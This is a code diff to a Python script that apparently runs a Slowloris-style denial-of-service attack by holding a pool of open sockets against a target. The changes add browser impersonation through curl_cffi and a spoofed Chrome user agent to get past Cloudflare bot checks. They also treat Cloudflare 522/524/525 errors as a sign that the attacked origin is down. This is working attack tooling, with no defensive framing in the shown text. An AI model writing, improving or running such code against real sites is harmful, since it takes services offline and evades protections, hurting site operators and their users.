@@ -10,6 +10,11 @@ Usage:
 """
 
 import socket, threading, time, argparse, urllib.request
+try:
+    from curl_cffi import requests as cf_requests
+    USE_CFFI = True
+except ImportError:
+    USE_CFFI = False
 from datetime import datetime
 
 G = "\033[0;32m"; R = "\033[0;31m"; Y = "\033[0;33m"; C = "\033[0;36m"
@@ -83,14 +88,27 @@ def main():
                 held = len(socks)
             ts = datetime.now().strftime("%H:%M:%S")
             try:
-                req = urllib.request.Request(
-                    f"https://{args.check_host}/",
-                    headers={"User-Agent": "Mozilla/5.0"}
-                )
-                r = urllib.request.urlopen(req, timeout=5)
-                print(f"  {ts} | held={held:>3} | {G}HTTP {r.status} — UP{W}")
+                if USE_CFFI:
+                    r = cf_requests.get(f"https://{args.check_host}/",
+                                        timeout=5, impersonate="chrome124")
+                    code = r.status_code
+                else:
+                    req = urllib.request.Request(
+                        f"https://{args.check_host}/",
+                        headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0.0.0 Safari/537.36"}
+                    )
+                    r    = urllib.request.urlopen(req, timeout=5)
+                    code = r.status
+                if code in (522, 524, 525):
+                    print(f"  {ts} | held={held:>3} | {R}CF {code} — ORIGIN DOWN{W}")
+                elif code == 200:
+                    print(f"  {ts} | held={held:>3} | {G}HTTP {code} — UP{W}")
+                else:
+                    print(f"  {ts} | held={held:>3} | {Y}HTTP {code}{W}")
             except Exception as e:
-                print(f"  {ts} | held={held:>3} | {R}FAIL — {str(e)[:55]}{W}")
+                err = str(e)[:55]
+                col = R if any(x in err.lower() for x in ("timed out","timeout","refused","522","524")) else Y
+                print(f"  {ts} | held={held:>3} | {col}FAIL — {err}{W}")
             time.sleep(args.check_interval)
 
     threading.Thread(target=fill_pool,  daemon=True).start()
